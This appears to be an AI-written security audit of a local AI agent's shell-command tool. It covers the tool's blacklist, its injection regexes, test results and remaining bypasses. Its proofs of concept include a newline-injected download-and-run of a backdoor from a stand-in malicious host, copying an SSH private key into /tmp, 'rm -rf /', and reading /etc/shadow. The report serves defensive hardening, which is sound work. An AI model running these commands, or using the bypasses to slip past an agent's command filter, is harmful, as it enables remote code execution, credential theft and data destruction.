# Security Verification Report: run_shell_command Function

**Date:** 2025-12-07
**Function:** `run_shell_command` in `/home/artur/Scripts/Python/src/ai-agent/src/local_agent.py`
**Lines:** 194-382

---

## Executive Summary

**Overall Security Rating:** MODERATE-HIGH RISK
**Critical Vulnerabilities Found:** 2
**Medium Vulnerabilities Found:** 3
**Security Improvements Verified:** 3

The updated implementation includes improved injection protection, but several critical bypasses remain possible. The fundamental issue is using `shell=True` with a blacklist approach.

---

## Changes Verified

### 1. Path-based Bypass Prevention (Lines 328-329)
**Implementation:**
```python
base_command = os.path.basename(cmd_parts[0])
```

**Status:** EFFECTIVE
**Analysis:**
- Successfully extracts base command from paths
- `/bin/rm file` → basename is `rm` → BLOCKED ✓
- `./rm file` → basename is `rm` → BLOCKED ✓
- `../../../bin/rm file` → basename is `rm` → BLOCKED ✓

**Test Results:**
- `/bin/rm file` - Blocked correctly
- `/usr/bin/python script.py` - Blocked correctly
- `./malicious_rm` - Would be blocked if named "rm"

---

### 2. Shell Injection Pattern Detection (Lines 340-358)
**Implementation:**
```python
dangerous_patterns = [
    r';',           # Command chaining
    r'&&',          # AND chaining
    r'\|\|',        # OR chaining
    r'`',           # Command substitution (backticks)
    r'\$\(',        # Command substitution $(...)
    r'>\s*/dev/',   # Writing to devices
    r'<\s*/dev/',   # Reading from devices
    r'>\s*/proc/',  # Writing to proc
    r'>\s*/sys/',   # Writing to sys
    r'\|.*\b(bash|sh|zsh|fish|python|perl|ruby|node)\b',
]
```

**Status:** PARTIALLY EFFECTIVE
**Analysis:**
- Blocks basic command chaining (`;`, `&&`, `||`) ✓
- Blocks command substitution (backticks, `$()`) ✓
- Blocks dangerous device writes ✓
- Blocks piping to interpreters ✓

**Test Results:**
```
✓ BLOCKED: ls; rm file
✓ BLOCKED: ls && rm file
✓ BLOCKED: ls || rm file
✓ BLOCKED: ls | bash
✓ BLOCKED: echo test > /dev/null
✓ ALLOWED: ls | grep test (safe pipe)
✓ ALLOWED: echo test > file.txt (safe redirect)
```

---

## Critical Vulnerabilities Discovered

### CRITICAL #1: Newline Injection Bypass
**Severity:** HIGH
**Lines Affected:** 340-358

**Vulnerability:**
The regex patterns do not detect newline characters (`\n`), which can bypass command chaining detection when using `shell=True`.

**Exploit:**
```python
command = "ls\nrm -rf /"
# This would execute TWO commands because shell=True interprets newlines
```

**Proof of Concept:**
```python
# Attacker input:
"ls\nwget http://malicious.com/backdoor.sh\nchmod +x backdoor.sh\nbash backdoor.sh"

# What happens:
# 1. "ls" passes all checks (base command is "ls", no dangerous patterns)
# 2. But shell=True executes it as a multi-line script
# 3. All four commands execute sequentially
```

**Why It Works:**
- `cmd_parts[0]` is `"ls\nwget"` but when split by whitespace, only sees `"ls"`
- No regex pattern checks for `\n`
- `shell=True` treats newlines as command separators

**Fix Required:**
```python
# Add to dangerous_patterns:
r'\n',          # Newline injection
r'\r',          # Carriage return injection

# Or check before regex:
if '\n' in command or '\r' in command:
    return "Error: Newlines not allowed in commands"
```

---

### CRITICAL #2: Brace Expansion Injection
**Severity:** MEDIUM-HIGH
**Lines Affected:** 340-358

**Vulnerability:**
Bash brace expansion is not blocked, allowing creation of arbitrary filenames or command sequences.

**Exploit:**
```python
# Create malicious files:
command = "touch {a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p}"

# Even more dangerous with file globbing:
command = "cat /etc/{passwd,shadow,sudoers}"

# Could be used to exfiltrate data:
command = "echo {sensitive,data,here} > /tmp/exfil.txt"
```

**Why It's Dangerous:**
- Not directly command injection, but can be used for data exfiltration
- Could create many files to cause DoS
- Combined with other techniques, could be part of attack chain

**Fix Required:**
```python
# Add to dangerous_patterns:
r'\{.*,.*\}',   # Brace expansion
```

---

## Medium Severity Vulnerabilities

### MEDIUM #1: Redirection Bypass
**Severity:** MEDIUM
**Lines Affected:** 346-349

**Vulnerability:**
The regex only blocks redirects to `/dev/`, `/proc/`, `/sys/`. Regular file redirects are allowed, which could:
1. Overwrite important user files
2. Create files in writable directories for later exploitation
3. Exfiltrate data to world-readable locations

**Exploit:**
```python
# Overwrite user's .bashrc with malicious code:
command = "echo 'malicious code' > ~/.bashrc"

# Exfiltrate data to /tmp (world-readable):
command = "cat ~/.ssh/id_rsa > /tmp/stolen_key"

# Create malicious files for later use:
command = "echo '#!/bin/bash\nrm -rf /' > /tmp/evil.sh"
```

**Why Current Check Insufficient:**
```python
r'>\s*/dev/',   # Only blocks /dev/
r'>\s*/proc/',  # Only blocks /proc/
r'>\s*/sys/',   # Only blocks /sys/
# But allows: > /tmp/, > ~/, > /var/tmp/, > /home/user/
```

**Risk Assessment:**
- Can't directly execute malicious code (no piping to interpreters)
- But can prepare attack for later execution
- Can exfiltrate sensitive data to readable locations

**Recommendation:**
Consider blocking ALL output redirects (`>`, `>>`), or whitelist safe redirect patterns.

---

### MEDIUM #2: Environment Variable Expansion
**Severity:** MEDIUM
**Lines Affected:** 340-358

**Vulnerability:**
Environment variable expansion is not blocked (only `$()` command substitution is blocked).

**Exploit:**
```python
# Expand environment variables:
command = "echo $PATH"           # Leaks PATH
command = "echo $HOME"           # Leaks home directory
command = "echo $SSH_AUTH_SOCK"  # Leaks SSH agent socket

# More dangerous with file operations:
command = "ls $HOME/.ssh"        # List SSH keys
command = "head $HOME/.bashrc"   # Read bash config
```

**Why It's Dangerous:**
- Information disclosure about system configuration
- Could reveal sensitive paths or credentials in environment
- Combined with redirects, could exfiltrate environment data

**Current Protection:**
```python
r'\$\(',        # Blocks $(command)
# But NOT:
# $VARIABLE      - Simple expansion (not blocked)
# ${VARIABLE}    - Brace expansion (not blocked)
```

**Fix Required:**
```python
# Add to dangerous_patterns:
r'\$[A-Za-z_]',     # Variable expansion
r'\$\{',            # Brace variable expansion
```

---

### MEDIUM #3: Input Redirection Not Blocked
**Severity:** LOW-MEDIUM
**Lines Affected:** 347

**Vulnerability:**
Only blocks `< /dev/` but allows other input redirects.

**Exploit:**
```python
# Read sensitive files via input redirection:
command = "wc -l < ~/.ssh/id_rsa"
command = "head < /etc/passwd"
```

**Why It's Dangerous:**
- Could read files that `read_file` tool would block (size limits)
- Bypasses file reading restrictions

**Current Protection:**
```python
r'<\s*/dev/',   # Only blocks /dev/
# But allows: < /home/, < /etc/, < ~/.ssh/
```

**Fix Required:**
```python
# Add to dangerous_patterns:
r'<',           # Block all input redirects
```

---

## Bypasses Still Possible

### 1. Whitespace Bypass
**Status:** FIXED ✓
The `cmd_parts = command.strip().split()` handles various whitespace correctly.

### 2. Quote Bypass
**Status:** NEEDS REVIEW
**Issue:**
```python
# Could hide commands in quotes:
command = "echo 'ls; rm -rf /'"  # Safe (just echoes the string)
command = "eval 'rm -rf /'"      # Dangerous but 'eval' is blacklisted
```
Currently safe because dangerous commands are blacklisted, but worth monitoring.

### 3. Wildcard Expansion
**Status:** PARTIALLY VULNERABLE
**Issue:**
```python
# Could match unintended files:
command = "ls /etc/p*"           # Lists /etc/passwd, /etc/pam.d/, etc.
command = "cat /etc/p?????d"     # Reads /etc/passwd
```
Not directly dangerous with current whitelist, but could be used for reconnaissance.

---

## Test Case Results

### Path-based Bypasses
```
Test: "/bin/rm file"
Expected: BLOCKED (basename is "rm")
Result: BLOCKED ✓

Test: "./rm file"
Expected: BLOCKED (basename is "rm")
Result: BLOCKED ✓

Test: "../../../bin/python script.py"
Expected: BLOCKED (basename is "python")
Result: BLOCKED ✓
```

### Command Chaining
```
Test: "ls; rm file"
Expected: BLOCKED (semicolon detected)
Result: BLOCKED ✓

Test: "ls && rm file"
Expected: BLOCKED (&& detected)
Result: BLOCKED ✓

Test: "ls || rm file"
Expected: BLOCKED (|| detected)
Result: BLOCKED ✓
```

### Command Substitution
```
Test: "echo `whoami`"
Expected: BLOCKED (backtick detected)
Result: BLOCKED ✓

Test: "echo $(whoami)"
Expected: BLOCKED ($( detected)
Result: BLOCKED ✓
```

### Piping
```
Test: "ls | grep test"
Expected: ALLOWED (safe pipe)
Result: ALLOWED ✓

Test: "ls | bash"
Expected: BLOCKED (pipe to interpreter)
Result: BLOCKED ✓

Test: "cat file | python"
Expected: BLOCKED (pipe to interpreter)
Result: BLOCKED ✓
```

### Redirects
```
Test: "echo test > /dev/null"
Expected: BLOCKED (> /dev/)
Result: BLOCKED ✓

Test: "echo test > file.txt"
Expected: ALLOWED (safe redirect)
Result: ALLOWED ✓

Test: "cat ~/.ssh/id_rsa > /tmp/stolen"
Expected: Currently ALLOWED (vulnerability)
Result: ALLOWED ⚠️
```

### Newline Injection (CRITICAL)
```
Test: "ls\nrm -rf /"
Expected: Should be BLOCKED
Result: Currently ALLOWED ⚠️ CRITICAL

Reason: No check for \n in command string
Impact: Shell executes multiple commands
```

---

## Recommendations

### CRITICAL (Implement Immediately)

1. **Block Newline Injection**
   ```python
   # Add before regex checks:
   if '\n' in command or '\r' in command:
       return "Error: Newlines not allowed in commands"
   ```

2. **Consider Moving to Whitelist Approach**
   ```python
   # Instead of blacklist, use:
   allowed_commands = ['ls', 'pwd', 'cat', 'grep', 'find', 'echo',
                       'date', 'whoami', 'df', 'du', 'head', 'tail',
                       'wc', 'ps', 'hostname', 'uname', 'free', 'uptime']

   if base_command not in allowed_commands:
       return f"Error: Command '{base_command}' not in whitelist"
   ```

   This is mentioned in docstring but not implemented. Current implementation is still blacklist-based.

### HIGH PRIORITY

3. **Block Brace Expansion**
   ```python
   r'\{.*,.*\}',   # Brace expansion
   ```

4. **Block Environment Variable Expansion**
   ```python
   r'\$[A-Za-z_]',     # Variable expansion
   r'\$\{',            # Brace variable expansion
   ```

5. **Restrict Redirects**
   ```python
   # Option A: Block all redirects
   r'>',
   r'<',

   # Option B: Whitelist safe redirects
   # Only allow: > /tmp/safe_dir/*.txt
   ```

### MEDIUM PRIORITY

6. **Add Input Validation**
   ```python
   # Limit command length
   if len(command) > 500:
       return "Error: Command too long"

   # Block suspicious patterns
   if '..' in command:
       return "Error: Directory traversal not allowed"
   ```

7. **Improve Error Messages**
   - Show which pattern was detected
   - Don't reveal full blacklist to avoid enumeration

8. **Add Logging**
   ```python
   import logging
   logging.warning(f"Blocked command attempt: {command}")
   ```

---

## Architecture Concerns

### Fundamental Issue: shell=True
**Line 362:**
```python
result = subprocess.run(
    command,
    shell=True,  # <-- ROOT CAUSE OF VULNERABILITIES
    ...
)
```

**Why This Is Dangerous:**
- Invokes full shell interpreter (bash/sh)
- Enables all shell features: pipes, redirects, expansions, globbing
- Makes injection prevention extremely difficult
- Blacklist approach is inherently incomplete

**Better Approach:**
```python
# Use shell=False with argument list:
result = subprocess.run(
    [base_command] + cmd_parts[1:],  # List of arguments
    shell=False,                      # No shell interpretation
    ...
)
```

**Benefits:**
- No command injection possible
- No need for complex regex patterns
- Much simpler security model
- Only need to validate base_command

**Tradeoff:**
- Loses shell features (pipes, redirects, globbing)
- But these can be dangerous anyway
- For safe operations like `ls | grep`, create dedicated tools

---

## False Positive Analysis

### Legitimate Commands That Might Be Blocked

1. **Safe Pipes**
   ```
   ls | grep test          ✓ ALLOWED (correct)
   ps aux | grep python    ✓ ALLOWED (correct)
   ```

2. **Safe Redirects**
   ```
   echo test > file.txt    ✓ ALLOWED (correct)
   cat file >> log.txt     ✓ ALLOWED (correct)
   ```

3. **File Paths with Spaces**
   ```
   ls "My Documents"       ✓ ALLOWED (correct)
   cat 'file with spaces'  ✓ ALLOWED (correct)
   ```

**Conclusion:** Very low false positive rate. Implementation maintains good usability for legitimate operations.

---

## Security Checklist

| Check | Status | Notes |
|-------|--------|-------|
| Basename extraction prevents /bin/rm | ✓ PASS | Lines 328-329 |
| Blocks command chaining (;, &&, ||) | ✓ PASS | Lines 341-343 |
| Blocks command substitution | ✓ PASS | Lines 344-345 |
| Blocks pipe to interpreters | ✓ PASS | Line 350 |
| Blocks dangerous device writes | ✓ PASS | Lines 346-349 |
| Blocks newline injection | ✗ FAIL | **CRITICAL** |
| Blocks brace expansion | ✗ FAIL | **HIGH** |
| Blocks variable expansion | ✗ FAIL | **MEDIUM** |
| Restricts output redirects | ~ PARTIAL | **MEDIUM** |
| Uses whitelist approach | ✗ FAIL | Still blacklist |
| Uses shell=False | ✗ FAIL | Architecture issue |

**Overall Score: 6/11 (55%)**

---

## Conclusion

### Strengths
1. Basename extraction effectively prevents path-based bypasses
2. Comprehensive blacklist of dangerous commands (321 entries)
3. Good coverage of basic injection patterns
4. Clear documentation in docstring
5. Low false positive rate

### Critical Weaknesses
1. **Newline injection vulnerability** - Can execute arbitrary command sequences
2. **Still uses shell=True** - Fundamentally dangerous architecture
3. **Blacklist approach** - Incomplete protection by design
4. Unrestricted output redirects allow data exfiltration
5. Environment variable expansion leaks system info

### Immediate Actions Required
1. Add newline/carriage return check (5 minutes)
2. Add brace expansion check (2 minutes)
3. Consider migration to shell=False architecture (2-4 hours)
4. Add comprehensive logging (30 minutes)

### Long-term Recommendation
**Migrate to whitelist + shell=False architecture** for production use. Current implementation is acceptable for development/experimentation but has too many edge cases for production security.

---

**Verified By:** Claude Sonnet 4.5
**Verification Date:** 2025-12-07
**Next Review:** After implementing critical fixes
